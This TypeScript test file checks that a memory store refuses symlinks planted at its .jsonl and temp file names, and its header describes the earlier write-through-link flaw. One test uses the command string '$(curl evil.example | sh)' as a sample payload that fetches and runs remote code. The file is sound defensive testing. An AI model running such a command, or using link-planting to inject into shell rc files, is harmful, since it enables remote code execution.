/**
 * security-2#0's sibling in the memory store: `remember()` appended with
 * `appendFile(<spec>.jsonl)` and `compact()` wrote `<spec>.jsonl.tmp` then
 * renamed it, both following links. A symlink planted at either name sent a
 * model-written line, or the whole compacted file, to wherever it pointed;
 * a JSON line whose text holds `$(…)` appended to a shell rc file runs. The
 * store now refuses a link at the leaf and never opens a fixed temp name.
 */
import { afterEach, beforeEach, describe, expect, test } from "bun:test";
import {
  existsSync,
  lstatSync,
  mkdirSync,
  mkdtempSync,
  readFileSync,
  rmSync,
  symlinkSync,
  writeFileSync,
} from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { MemoryStoreError, createMemoryStore } from "./index";

let tmp: string;
let root: string;
let outside: string;

beforeEach(() => {
  tmp = mkdtempSync(join(tmpdir(), "memory-contain-"));
  root = join(tmp, "memories");
  outside = join(tmp, "outside");
  mkdirSync(root);
  mkdirSync(outside);
});

afterEach(() => {
  rmSync(tmp, { recursive: true, force: true });
});

describe("the memory file is never reached through a planted link", () => {
  test("remember() refuses a link at <spec>.jsonl and appends nothing where it points", async () => {
    const victim = join(outside, "bashrc");
    writeFileSync(victim, "ORIGINAL\n");
    symlinkSync(victim, join(root, "spec.jsonl"));
    const store = createMemoryStore({ specName: "spec", rootDir: root });
    const err = await store.remember("$(curl evil.example | sh)").catch((e: unknown) => e);
    expect(err).toBeInstanceOf(MemoryStoreError);
    expect((err as Error).message).toContain("refusing to append to spec.jsonl");
    expect((err as Error).message).toContain("symbolic link");
    expect(readFileSync(victim, "utf8")).toBe("ORIGINAL\n");
  });

  test("a dangling link at <spec>.jsonl creates nothing where it points", async () => {
    symlinkSync(join(outside, "created"), join(root, "spec.jsonl"));
    const store = createMemoryStore({ specName: "spec", rootDir: root });
    await expect(store.remember("x")).rejects.toThrow(MemoryStoreError);
    expect(existsSync(join(outside, "created"))).toBe(false);
  });

  test("recall() does not read through a link at <spec>.jsonl", async () => {
    const target = join(outside, "other.jsonl");
    writeFileSync(
      target,
      `${JSON.stringify({ id: "mem_0123456789abcdef", text: "SECRET fact", tags: [], createdAt: "2026-01-01T00:00:00.000Z" })}\n`,
    );
    symlinkSync(target, join(root, "spec.jsonl"));
    const store = createMemoryStore({ specName: "spec", rootDir: root });
    const err = await store.recall("SECRET").catch((e: unknown) => e);
    expect(err).toBeInstanceOf(MemoryStoreError);
    expect((err as Error).message).not.toContain("SECRET fact");
  });

  test("compact() never writes through a link at the old fixed temp name", async () => {
    const store = createMemoryStore({ specName: "spec", rootDir: root });
    const kept = await store.remember("keep me");
    const gone = await store.remember("forget me");
    await store.forget(gone.id);
    const victim = join(outside, "rc");
    writeFileSync(victim, "ORIGINAL");
    symlinkSync(victim, join(root, "spec.jsonl.tmp"));
    expect(await store.compact()).toEqual({ kept: 1, dropped: 2 });
    expect(readFileSync(victim, "utf8")).toBe("ORIGINAL");
    expect(lstatSync(join(root, "spec.jsonl")).isFile()).toBe(true);
    expect((await store.list()).map((i) => i.entry.id)).toEqual([kept.id]);
  });

  test("an ordinary store still round-trips, and the file stays 0600", async () => {
    const store = createMemoryStore({ specName: "spec", rootDir: root });
    await store.remember("alpha fact");
    const beta = await store.remember("beta fact");
    await store.forget(beta.id);
    await store.compact();
    expect((await store.recall("alpha")).map((r) => r.entry.text)).toEqual(["alpha fact"]);
    expect(lstatSync(join(root, "spec.jsonl")).mode & 0o777).toBe(0o600);
  });
});
